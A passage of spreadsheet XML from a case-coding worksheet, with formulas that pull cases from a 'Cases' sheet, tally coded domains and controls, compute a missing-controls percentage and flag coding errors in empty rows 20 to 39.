        <f>IF(AI20="","",IF(AI20=0,"No domain coded 1; ","")&amp;IF(M20="","Primary domain missing; ",IF(IFERROR(INDEX(E20:L20,1,M20),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N20:AG20)&lt;&gt;AJ20,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH20="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN20" s="13">
        <f>IF(AND(AI20&lt;&gt;"",AM20=""),1,0)</f>
        <v/>
      </c>
      <c r="AO20" s="14" t="n"/>
    </row>
    <row r="21">
      <c r="A21" s="11">
        <f>Cases!A21</f>
        <v/>
      </c>
      <c r="B21" s="11">
        <f>Cases!B21</f>
        <v/>
      </c>
      <c r="C21" s="11">
        <f>Cases!C21</f>
        <v/>
      </c>
      <c r="D21" s="11">
        <f>IF(Cases!F21="",LEFT(Cases!G21,120),Cases!F21)</f>
        <v/>
      </c>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c r="AE21" s="12" t="n"/>
      <c r="AF21" s="12" t="n"/>
      <c r="AG21" s="12" t="n"/>
      <c r="AH21" s="12" t="n"/>
      <c r="AI21" s="13">
        <f>IF(COUNT(E21:L21)=0,"",SUM(E21:L21))</f>
        <v/>
      </c>
      <c r="AJ21" s="13">
        <f>IF(AI21="","",N(E21)*3+N(F21)*2+N(G21)*2+N(H21)*2+N(I21)*2+N(J21)*3+N(K21)*3+N(L21)*3)</f>
        <v/>
      </c>
      <c r="AK21" s="13">
        <f>IF(AI21="","",COUNTIF(N21:AG21,1))</f>
        <v/>
      </c>
      <c r="AL21" s="13">
        <f>IF(OR(AJ21="",AJ21=0),"",ROUND(100*(AJ21-AK21)/AJ21,1))</f>
        <v/>
      </c>
      <c r="AM21" s="11">
        <f>IF(AI21="","",IF(AI21=0,"No domain coded 1; ","")&amp;IF(M21="","Primary domain missing; ",IF(IFERROR(INDEX(E21:L21,1,M21),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N21:AG21)&lt;&gt;AJ21,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH21="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN21" s="13">
        <f>IF(AND(AI21&lt;&gt;"",AM21=""),1,0)</f>
        <v/>
      </c>
      <c r="AO21" s="14" t="n"/>
    </row>
    <row r="22">
      <c r="A22" s="11">
        <f>Cases!A22</f>
        <v/>
      </c>
      <c r="B22" s="11">
        <f>Cases!B22</f>
        <v/>
      </c>
      <c r="C22" s="11">
        <f>Cases!C22</f>
        <v/>
      </c>
      <c r="D22" s="11">
        <f>IF(Cases!F22="",LEFT(Cases!G22,120),Cases!F22)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E22:L22)=0,"",SUM(E22:L22))</f>
        <v/>
      </c>
      <c r="AJ22" s="13">
        <f>IF(AI22="","",N(E22)*3+N(F22)*2+N(G22)*2+N(H22)*2+N(I22)*2+N(J22)*3+N(K22)*3+N(L22)*3)</f>
        <v/>
      </c>
      <c r="AK22" s="13">
        <f>IF(AI22="","",COUNTIF(N22:AG22,1))</f>
        <v/>
      </c>
      <c r="AL22" s="13">
        <f>IF(OR(AJ22="",AJ22=0),"",ROUND(100*(AJ22-AK22)/AJ22,1))</f>
        <v/>
      </c>
      <c r="AM22" s="11">
        <f>IF(AI22="","",IF(AI22=0,"No domain coded 1; ","")&amp;IF(M22="","Primary domain missing; ",IF(IFERROR(INDEX(E22:L22,1,M22),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N22:AG22)&lt;&gt;AJ22,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH22="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN22" s="13">
        <f>IF(AND(AI22&lt;&gt;"",AM22=""),1,0)</f>
        <v/>
      </c>
      <c r="AO22" s="14" t="n"/>
    </row>
    <row r="23">
      <c r="A23" s="11">
        <f>Cases!A23</f>
        <v/>
      </c>
      <c r="B23" s="11">
        <f>Cases!B23</f>
        <v/>
      </c>
      <c r="C23" s="11">
        <f>Cases!C23</f>
        <v/>
      </c>
      <c r="D23" s="11">
        <f>IF(Cases!F23="",LEFT(Cases!G23,120),Cases!F23)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E23:L23)=0,"",SUM(E23:L23))</f>
        <v/>
      </c>
      <c r="AJ23" s="13">
        <f>IF(AI23="","",N(E23)*3+N(F23)*2+N(G23)*2+N(H23)*2+N(I23)*2+N(J23)*3+N(K23)*3+N(L23)*3)</f>
        <v/>
      </c>
      <c r="AK23" s="13">
        <f>IF(AI23="","",COUNTIF(N23:AG23,1))</f>
        <v/>
      </c>
      <c r="AL23" s="13">
        <f>IF(OR(AJ23="",AJ23=0),"",ROUND(100*(AJ23-AK23)/AJ23,1))</f>
        <v/>
      </c>
      <c r="AM23" s="11">
        <f>IF(AI23="","",IF(AI23=0,"No domain coded 1; ","")&amp;IF(M23="","Primary domain missing; ",IF(IFERROR(INDEX(E23:L23,1,M23),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N23:AG23)&lt;&gt;AJ23,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH23="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN23" s="13">
        <f>IF(AND(AI23&lt;&gt;"",AM23=""),1,0)</f>
        <v/>
      </c>
      <c r="AO23" s="14" t="n"/>
    </row>
    <row r="24">
      <c r="A24" s="11">
        <f>Cases!A24</f>
        <v/>
      </c>
      <c r="B24" s="11">
        <f>Cases!B24</f>
        <v/>
      </c>
      <c r="C24" s="11">
        <f>Cases!C24</f>
        <v/>
      </c>
      <c r="D24" s="11">
        <f>IF(Cases!F24="",LEFT(Cases!G24,120),Cases!F24)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI24" s="13">
        <f>IF(COUNT(E24:L24)=0,"",SUM(E24:L24))</f>
        <v/>
      </c>
      <c r="AJ24" s="13">
        <f>IF(AI24="","",N(E24)*3+N(F24)*2+N(G24)*2+N(H24)*2+N(I24)*2+N(J24)*3+N(K24)*3+N(L24)*3)</f>
        <v/>
      </c>
      <c r="AK24" s="13">
        <f>IF(AI24="","",COUNTIF(N24:AG24,1))</f>
        <v/>
      </c>
      <c r="AL24" s="13">
        <f>IF(OR(AJ24="",AJ24=0),"",ROUND(100*(AJ24-AK24)/AJ24,1))</f>
        <v/>
      </c>
      <c r="AM24" s="11">
        <f>IF(AI24="","",IF(AI24=0,"No domain coded 1; ","")&amp;IF(M24="","Primary domain missing; ",IF(IFERROR(INDEX(E24:L24,1,M24),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N24:AG24)&lt;&gt;AJ24,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH24="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN24" s="13">
        <f>IF(AND(AI24&lt;&gt;"",AM24=""),1,0)</f>
        <v/>
      </c>
      <c r="AO24" s="14" t="n"/>
    </row>
    <row r="25">
      <c r="A25" s="11">
        <f>Cases!A25</f>
        <v/>
      </c>
      <c r="B25" s="11">
        <f>Cases!B25</f>
        <v/>
      </c>
      <c r="C25" s="11">
        <f>Cases!C25</f>
        <v/>
      </c>
      <c r="D25" s="11">
        <f>IF(Cases!F25="",LEFT(Cases!G25,120),Cases!F25)</f>
        <v/>
      </c>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c r="AI25" s="13">
        <f>IF(COUNT(E25:L25)=0,"",SUM(E25:L25))</f>
        <v/>
      </c>
      <c r="AJ25" s="13">
        <f>IF(AI25="","",N(E25)*3+N(F25)*2+N(G25)*2+N(H25)*2+N(I25)*2+N(J25)*3+N(K25)*3+N(L25)*3)</f>
        <v/>
      </c>
      <c r="AK25" s="13">
        <f>IF(AI25="","",COUNTIF(N25:AG25,1))</f>
        <v/>
      </c>
      <c r="AL25" s="13">
        <f>IF(OR(AJ25="",AJ25=0),"",ROUND(100*(AJ25-AK25)/AJ25,1))</f>
        <v/>
      </c>
      <c r="AM25" s="11">
        <f>IF(AI25="","",IF(AI25=0,"No domain coded 1; ","")&amp;IF(M25="","Primary domain missing; ",IF(IFERROR(INDEX(E25:L25,1,M25),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N25:AG25)&lt;&gt;AJ25,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH25="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN25" s="13">
        <f>IF(AND(AI25&lt;&gt;"",AM25=""),1,0)</f>
        <v/>
      </c>
      <c r="AO25" s="14" t="n"/>
    </row>
    <row r="26">
      <c r="A26" s="11">
        <f>Cases!A26</f>
        <v/>
      </c>
      <c r="B26" s="11">
        <f>Cases!B26</f>
        <v/>
      </c>
      <c r="C26" s="11">
        <f>Cases!C26</f>
        <v/>
      </c>
      <c r="D26" s="11">
        <f>IF(Cases!F26="",LEFT(Cases!G26,120),Cases!F26)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI26" s="13">
        <f>IF(COUNT(E26:L26)=0,"",SUM(E26:L26))</f>
        <v/>
      </c>
      <c r="AJ26" s="13">
        <f>IF(AI26="","",N(E26)*3+N(F26)*2+N(G26)*2+N(H26)*2+N(I26)*2+N(J26)*3+N(K26)*3+N(L26)*3)</f>
        <v/>
      </c>
      <c r="AK26" s="13">
        <f>IF(AI26="","",COUNTIF(N26:AG26,1))</f>
        <v/>
      </c>
      <c r="AL26" s="13">
        <f>IF(OR(AJ26="",AJ26=0),"",ROUND(100*(AJ26-AK26)/AJ26,1))</f>
        <v/>
      </c>
      <c r="AM26" s="11">
        <f>IF(AI26="","",IF(AI26=0,"No domain coded 1; ","")&amp;IF(M26="","Primary domain missing; ",IF(IFERROR(INDEX(E26:L26,1,M26),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N26:AG26)&lt;&gt;AJ26,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH26="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN26" s="13">
        <f>IF(AND(AI26&lt;&gt;"",AM26=""),1,0)</f>
        <v/>
      </c>
      <c r="AO26" s="14" t="n"/>
    </row>
    <row r="27">
      <c r="A27" s="11">
        <f>Cases!A27</f>
        <v/>
      </c>
      <c r="B27" s="11">
        <f>Cases!B27</f>
        <v/>
      </c>
      <c r="C27" s="11">
        <f>Cases!C27</f>
        <v/>
      </c>
      <c r="D27" s="11">
        <f>IF(Cases!F27="",LEFT(Cases!G27,120),Cases!F27)</f>
        <v/>
      </c>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c r="AI27" s="13">
        <f>IF(COUNT(E27:L27)=0,"",SUM(E27:L27))</f>
        <v/>
      </c>
      <c r="AJ27" s="13">
        <f>IF(AI27="","",N(E27)*3+N(F27)*2+N(G27)*2+N(H27)*2+N(I27)*2+N(J27)*3+N(K27)*3+N(L27)*3)</f>
        <v/>
      </c>
      <c r="AK27" s="13">
        <f>IF(AI27="","",COUNTIF(N27:AG27,1))</f>
        <v/>
      </c>
      <c r="AL27" s="13">
        <f>IF(OR(AJ27="",AJ27=0),"",ROUND(100*(AJ27-AK27)/AJ27,1))</f>
        <v/>
      </c>
      <c r="AM27" s="11">
        <f>IF(AI27="","",IF(AI27=0,"No domain coded 1; ","")&amp;IF(M27="","Primary domain missing; ",IF(IFERROR(INDEX(E27:L27,1,M27),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N27:AG27)&lt;&gt;AJ27,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH27="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN27" s="13">
        <f>IF(AND(AI27&lt;&gt;"",AM27=""),1,0)</f>
        <v/>
      </c>
      <c r="AO27" s="14" t="n"/>
    </row>
    <row r="28">
      <c r="A28" s="11">
        <f>Cases!A28</f>
        <v/>
      </c>
      <c r="B28" s="11">
        <f>Cases!B28</f>
        <v/>
      </c>
      <c r="C28" s="11">
        <f>Cases!C28</f>
        <v/>
      </c>
      <c r="D28" s="11">
        <f>IF(Cases!F28="",LEFT(Cases!G28,120),Cases!F28)</f>
        <v/>
      </c>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c r="AE28" s="12" t="n"/>
      <c r="AF28" s="12" t="n"/>
      <c r="AG28" s="12" t="n"/>
      <c r="AH28" s="12" t="n"/>
      <c r="AI28" s="13">
        <f>IF(COUNT(E28:L28)=0,"",SUM(E28:L28))</f>
        <v/>
      </c>
      <c r="AJ28" s="13">
        <f>IF(AI28="","",N(E28)*3+N(F28)*2+N(G28)*2+N(H28)*2+N(I28)*2+N(J28)*3+N(K28)*3+N(L28)*3)</f>
        <v/>
      </c>
      <c r="AK28" s="13">
        <f>IF(AI28="","",COUNTIF(N28:AG28,1))</f>
        <v/>
      </c>
      <c r="AL28" s="13">
        <f>IF(OR(AJ28="",AJ28=0),"",ROUND(100*(AJ28-AK28)/AJ28,1))</f>
        <v/>
      </c>
      <c r="AM28" s="11">
        <f>IF(AI28="","",IF(AI28=0,"No domain coded 1; ","")&amp;IF(M28="","Primary domain missing; ",IF(IFERROR(INDEX(E28:L28,1,M28),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N28:AG28)&lt;&gt;AJ28,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH28="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN28" s="13">
        <f>IF(AND(AI28&lt;&gt;"",AM28=""),1,0)</f>
        <v/>
      </c>
      <c r="AO28" s="14" t="n"/>
    </row>
    <row r="29">
      <c r="A29" s="11">
        <f>Cases!A29</f>
        <v/>
      </c>
      <c r="B29" s="11">
        <f>Cases!B29</f>
        <v/>
      </c>
      <c r="C29" s="11">
        <f>Cases!C29</f>
        <v/>
      </c>
      <c r="D29" s="11">
        <f>IF(Cases!F29="",LEFT(Cases!G29,120),Cases!F29)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E29:L29)=0,"",SUM(E29:L29))</f>
        <v/>
      </c>
      <c r="AJ29" s="13">
        <f>IF(AI29="","",N(E29)*3+N(F29)*2+N(G29)*2+N(H29)*2+N(I29)*2+N(J29)*3+N(K29)*3+N(L29)*3)</f>
        <v/>
      </c>
      <c r="AK29" s="13">
        <f>IF(AI29="","",COUNTIF(N29:AG29,1))</f>
        <v/>
      </c>
      <c r="AL29" s="13">
        <f>IF(OR(AJ29="",AJ29=0),"",ROUND(100*(AJ29-AK29)/AJ29,1))</f>
        <v/>
      </c>
      <c r="AM29" s="11">
        <f>IF(AI29="","",IF(AI29=0,"No domain coded 1; ","")&amp;IF(M29="","Primary domain missing; ",IF(IFERROR(INDEX(E29:L29,1,M29),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N29:AG29)&lt;&gt;AJ29,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH29="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN29" s="13">
        <f>IF(AND(AI29&lt;&gt;"",AM29=""),1,0)</f>
        <v/>
      </c>
      <c r="AO29" s="14" t="n"/>
    </row>
    <row r="30">
      <c r="A30" s="11">
        <f>Cases!A30</f>
        <v/>
      </c>
      <c r="B30" s="11">
        <f>Cases!B30</f>
        <v/>
      </c>
      <c r="C30" s="11">
        <f>Cases!C30</f>
        <v/>
      </c>
      <c r="D30" s="11">
        <f>IF(Cases!F30="",LEFT(Cases!G30,120),Cases!F30)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E30:L30)=0,"",SUM(E30:L30))</f>
        <v/>
      </c>
      <c r="AJ30" s="13">
        <f>IF(AI30="","",N(E30)*3+N(F30)*2+N(G30)*2+N(H30)*2+N(I30)*2+N(J30)*3+N(K30)*3+N(L30)*3)</f>
        <v/>
      </c>
      <c r="AK30" s="13">
        <f>IF(AI30="","",COUNTIF(N30:AG30,1))</f>
        <v/>
      </c>
      <c r="AL30" s="13">
        <f>IF(OR(AJ30="",AJ30=0),"",ROUND(100*(AJ30-AK30)/AJ30,1))</f>
        <v/>
      </c>
      <c r="AM30" s="11">
        <f>IF(AI30="","",IF(AI30=0,"No domain coded 1; ","")&amp;IF(M30="","Primary domain missing; ",IF(IFERROR(INDEX(E30:L30,1,M30),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N30:AG30)&lt;&gt;AJ30,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH30="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN30" s="13">
        <f>IF(AND(AI30&lt;&gt;"",AM30=""),1,0)</f>
        <v/>
      </c>
      <c r="AO30" s="14" t="n"/>
    </row>
    <row r="31">
      <c r="A31" s="11">
        <f>Cases!A31</f>
        <v/>
      </c>
      <c r="B31" s="11">
        <f>Cases!B31</f>
        <v/>
      </c>
      <c r="C31" s="11">
        <f>Cases!C31</f>
        <v/>
      </c>
      <c r="D31" s="11">
        <f>IF(Cases!F31="",LEFT(Cases!G31,120),Cases!F31)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E31:L31)=0,"",SUM(E31:L31))</f>
        <v/>
      </c>
      <c r="AJ31" s="13">
        <f>IF(AI31="","",N(E31)*3+N(F31)*2+N(G31)*2+N(H31)*2+N(I31)*2+N(J31)*3+N(K31)*3+N(L31)*3)</f>
        <v/>
      </c>
      <c r="AK31" s="13">
        <f>IF(AI31="","",COUNTIF(N31:AG31,1))</f>
        <v/>
      </c>
      <c r="AL31" s="13">
        <f>IF(OR(AJ31="",AJ31=0),"",ROUND(100*(AJ31-AK31)/AJ31,1))</f>
        <v/>
      </c>
      <c r="AM31" s="11">
        <f>IF(AI31="","",IF(AI31=0,"No domain coded 1; ","")&amp;IF(M31="","Primary domain missing; ",IF(IFERROR(INDEX(E31:L31,1,M31),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N31:AG31)&lt;&gt;AJ31,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH31="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN31" s="13">
        <f>IF(AND(AI31&lt;&gt;"",AM31=""),1,0)</f>
        <v/>
      </c>
      <c r="AO31" s="14" t="n"/>
    </row>
    <row r="32">
      <c r="A32" s="11">
        <f>Cases!A32</f>
        <v/>
      </c>
      <c r="B32" s="11">
        <f>Cases!B32</f>
        <v/>
      </c>
      <c r="C32" s="11">
        <f>Cases!C32</f>
        <v/>
      </c>
      <c r="D32" s="11">
        <f>IF(Cases!F32="",LEFT(Cases!G32,120),Cases!F32)</f>
        <v/>
      </c>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12" t="n"/>
      <c r="AI32" s="13">
        <f>IF(COUNT(E32:L32)=0,"",SUM(E32:L32))</f>
        <v/>
      </c>
      <c r="AJ32" s="13">
        <f>IF(AI32="","",N(E32)*3+N(F32)*2+N(G32)*2+N(H32)*2+N(I32)*2+N(J32)*3+N(K32)*3+N(L32)*3)</f>
        <v/>
      </c>
      <c r="AK32" s="13">
        <f>IF(AI32="","",COUNTIF(N32:AG32,1))</f>
        <v/>
      </c>
      <c r="AL32" s="13">
        <f>IF(OR(AJ32="",AJ32=0),"",ROUND(100*(AJ32-AK32)/AJ32,1))</f>
        <v/>
      </c>
      <c r="AM32" s="11">
        <f>IF(AI32="","",IF(AI32=0,"No domain coded 1; ","")&amp;IF(M32="","Primary domain missing; ",IF(IFERROR(INDEX(E32:L32,1,M32),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N32:AG32)&lt;&gt;AJ32,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH32="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN32" s="13">
        <f>IF(AND(AI32&lt;&gt;"",AM32=""),1,0)</f>
        <v/>
      </c>
      <c r="AO32" s="14" t="n"/>
    </row>
    <row r="33">
      <c r="A33" s="11">
        <f>Cases!A33</f>
        <v/>
      </c>
      <c r="B33" s="11">
        <f>Cases!B33</f>
        <v/>
      </c>
      <c r="C33" s="11">
        <f>Cases!C33</f>
        <v/>
      </c>
      <c r="D33" s="11">
        <f>IF(Cases!F33="",LEFT(Cases!G33,120),Cases!F33)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E33:L33)=0,"",SUM(E33:L33))</f>
        <v/>
      </c>
      <c r="AJ33" s="13">
        <f>IF(AI33="","",N(E33)*3+N(F33)*2+N(G33)*2+N(H33)*2+N(I33)*2+N(J33)*3+N(K33)*3+N(L33)*3)</f>
        <v/>
      </c>
      <c r="AK33" s="13">
        <f>IF(AI33="","",COUNTIF(N33:AG33,1))</f>
        <v/>
      </c>
      <c r="AL33" s="13">
        <f>IF(OR(AJ33="",AJ33=0),"",ROUND(100*(AJ33-AK33)/AJ33,1))</f>
        <v/>
      </c>
      <c r="AM33" s="11">
        <f>IF(AI33="","",IF(AI33=0,"No domain coded 1; ","")&amp;IF(M33="","Primary domain missing; ",IF(IFERROR(INDEX(E33:L33,1,M33),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N33:AG33)&lt;&gt;AJ33,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH33="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN33" s="13">
        <f>IF(AND(AI33&lt;&gt;"",AM33=""),1,0)</f>
        <v/>
      </c>
      <c r="AO33" s="14" t="n"/>
    </row>
    <row r="34">
      <c r="A34" s="11">
        <f>Cases!A34</f>
        <v/>
      </c>
      <c r="B34" s="11">
        <f>Cases!B34</f>
        <v/>
      </c>
      <c r="C34" s="11">
        <f>Cases!C34</f>
        <v/>
      </c>
      <c r="D34" s="11">
        <f>IF(Cases!F34="",LEFT(Cases!G34,120),Cases!F34)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E34:L34)=0,"",SUM(E34:L34))</f>
        <v/>
      </c>
      <c r="AJ34" s="13">
        <f>IF(AI34="","",N(E34)*3+N(F34)*2+N(G34)*2+N(H34)*2+N(I34)*2+N(J34)*3+N(K34)*3+N(L34)*3)</f>
        <v/>
      </c>
      <c r="AK34" s="13">
        <f>IF(AI34="","",COUNTIF(N34:AG34,1))</f>
        <v/>
      </c>
      <c r="AL34" s="13">
        <f>IF(OR(AJ34="",AJ34=0),"",ROUND(100*(AJ34-AK34)/AJ34,1))</f>
        <v/>
      </c>
      <c r="AM34" s="11">
        <f>IF(AI34="","",IF(AI34=0,"No domain coded 1; ","")&amp;IF(M34="","Primary domain missing; ",IF(IFERROR(INDEX(E34:L34,1,M34),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N34:AG34)&lt;&gt;AJ34,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH34="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN34" s="13">
        <f>IF(AND(AI34&lt;&gt;"",AM34=""),1,0)</f>
        <v/>
      </c>
      <c r="AO34" s="14" t="n"/>
    </row>
    <row r="35">
      <c r="A35" s="11">
        <f>Cases!A35</f>
        <v/>
      </c>
      <c r="B35" s="11">
        <f>Cases!B35</f>
        <v/>
      </c>
      <c r="C35" s="11">
        <f>Cases!C35</f>
        <v/>
      </c>
      <c r="D35" s="11">
        <f>IF(Cases!F35="",LEFT(Cases!G35,120),Cases!F35)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E35:L35)=0,"",SUM(E35:L35))</f>
        <v/>
      </c>
      <c r="AJ35" s="13">
        <f>IF(AI35="","",N(E35)*3+N(F35)*2+N(G35)*2+N(H35)*2+N(I35)*2+N(J35)*3+N(K35)*3+N(L35)*3)</f>
        <v/>
      </c>
      <c r="AK35" s="13">
        <f>IF(AI35="","",COUNTIF(N35:AG35,1))</f>
        <v/>
      </c>
      <c r="AL35" s="13">
        <f>IF(OR(AJ35="",AJ35=0),"",ROUND(100*(AJ35-AK35)/AJ35,1))</f>
        <v/>
      </c>
      <c r="AM35" s="11">
        <f>IF(AI35="","",IF(AI35=0,"No domain coded 1; ","")&amp;IF(M35="","Primary domain missing; ",IF(IFERROR(INDEX(E35:L35,1,M35),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N35:AG35)&lt;&gt;AJ35,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH35="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN35" s="13">
        <f>IF(AND(AI35&lt;&gt;"",AM35=""),1,0)</f>
        <v/>
      </c>
      <c r="AO35" s="14" t="n"/>
    </row>
    <row r="36">
      <c r="A36" s="11">
        <f>Cases!A36</f>
        <v/>
      </c>
      <c r="B36" s="11">
        <f>Cases!B36</f>
        <v/>
      </c>
      <c r="C36" s="11">
        <f>Cases!C36</f>
        <v/>
      </c>
      <c r="D36" s="11">
        <f>IF(Cases!F36="",LEFT(Cases!G36,120),Cases!F36)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E36:L36)=0,"",SUM(E36:L36))</f>
        <v/>
      </c>
      <c r="AJ36" s="13">
        <f>IF(AI36="","",N(E36)*3+N(F36)*2+N(G36)*2+N(H36)*2+N(I36)*2+N(J36)*3+N(K36)*3+N(L36)*3)</f>
        <v/>
      </c>
      <c r="AK36" s="13">
        <f>IF(AI36="","",COUNTIF(N36:AG36,1))</f>
        <v/>
      </c>
      <c r="AL36" s="13">
        <f>IF(OR(AJ36="",AJ36=0),"",ROUND(100*(AJ36-AK36)/AJ36,1))</f>
        <v/>
      </c>
      <c r="AM36" s="11">
        <f>IF(AI36="","",IF(AI36=0,"No domain coded 1; ","")&amp;IF(M36="","Primary domain missing; ",IF(IFERROR(INDEX(E36:L36,1,M36),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N36:AG36)&lt;&gt;AJ36,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH36="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN36" s="13">
        <f>IF(AND(AI36&lt;&gt;"",AM36=""),1,0)</f>
        <v/>
      </c>
      <c r="AO36" s="14" t="n"/>
    </row>
    <row r="37">
      <c r="A37" s="11">
        <f>Cases!A37</f>
        <v/>
      </c>
      <c r="B37" s="11">
        <f>Cases!B37</f>
        <v/>
      </c>
      <c r="C37" s="11">
        <f>Cases!C37</f>
        <v/>
      </c>
      <c r="D37" s="11">
        <f>IF(Cases!F37="",LEFT(Cases!G37,120),Cases!F37)</f>
        <v/>
      </c>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c r="AI37" s="13">
        <f>IF(COUNT(E37:L37)=0,"",SUM(E37:L37))</f>
        <v/>
      </c>
      <c r="AJ37" s="13">
        <f>IF(AI37="","",N(E37)*3+N(F37)*2+N(G37)*2+N(H37)*2+N(I37)*2+N(J37)*3+N(K37)*3+N(L37)*3)</f>
        <v/>
      </c>
      <c r="AK37" s="13">
        <f>IF(AI37="","",COUNTIF(N37:AG37,1))</f>
        <v/>
      </c>
      <c r="AL37" s="13">
        <f>IF(OR(AJ37="",AJ37=0),"",ROUND(100*(AJ37-AK37)/AJ37,1))</f>
        <v/>
      </c>
      <c r="AM37" s="11">
        <f>IF(AI37="","",IF(AI37=0,"No domain coded 1; ","")&amp;IF(M37="","Primary domain missing; ",IF(IFERROR(INDEX(E37:L37,1,M37),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N37:AG37)&lt;&gt;AJ37,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH37="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN37" s="13">
        <f>IF(AND(AI37&lt;&gt;"",AM37=""),1,0)</f>
        <v/>
      </c>
      <c r="AO37" s="14" t="n"/>
    </row>
    <row r="38">
      <c r="A38" s="11">
        <f>Cases!A38</f>
        <v/>
      </c>
      <c r="B38" s="11">
        <f>Cases!B38</f>
        <v/>
      </c>
      <c r="C38" s="11">
        <f>Cases!C38</f>
        <v/>
      </c>
      <c r="D38" s="11">
        <f>IF(Cases!F38="",LEFT(Cases!G38,120),Cases!F38)</f>
        <v/>
      </c>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c r="AH38" s="12" t="n"/>
      <c r="AI38" s="13">
        <f>IF(COUNT(E38:L38)=0,"",SUM(E38:L38))</f>
        <v/>
      </c>
      <c r="AJ38" s="13">
        <f>IF(AI38="","",N(E38)*3+N(F38)*2+N(G38)*2+N(H38)*2+N(I38)*2+N(J38)*3+N(K38)*3+N(L38)*3)</f>
        <v/>
      </c>
      <c r="AK38" s="13">
        <f>IF(AI38="","",COUNTIF(N38:AG38,1))</f>
        <v/>
      </c>
      <c r="AL38" s="13">
        <f>IF(OR(AJ38="",AJ38=0),"",ROUND(100*(AJ38-AK38)/AJ38,1))</f>
        <v/>
      </c>
      <c r="AM38" s="11">
        <f>IF(AI38="","",IF(AI38=0,"No domain coded 1; ","")&amp;IF(M38="","Primary domain missing; ",IF(IFERROR(INDEX(E38:L38,1,M38),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N38:AG38)&lt;&gt;AJ38,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH38="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN38" s="13">
        <f>IF(AND(AI38&lt;&gt;"",AM38=""),1,0)</f>
        <v/>
      </c>
      <c r="AO38" s="14" t="n"/>
    </row>
    <row r="39">
      <c r="A39" s="11">
        <f>Cases!A39</f>
        <v/>
      </c>
      <c r="B39" s="11">
        <f>Cases!B39</f>
        <v/>
      </c>
